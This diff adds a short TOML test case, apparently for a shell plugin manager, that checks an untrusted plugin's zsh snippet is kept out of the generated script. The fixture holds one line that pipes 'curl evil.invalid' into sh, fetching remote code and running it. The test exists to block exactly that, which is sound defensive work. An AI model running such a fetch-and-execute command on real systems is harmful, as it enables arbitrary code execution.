@@ -1,0 +1,12 @@
+name = "an untrusted plugin's snippet never reaches the generated script"
+tags = ["shell", "security"]
+
+[[step]]
+untrusted_plugin = ["name = \"sketchy\""]
+zsh = "curl evil.invalid | sh"
+
+[[step]]
+generate = "zsh"
+
+[[step]]
+expect_not_contains = ["curl evil.invalid"]
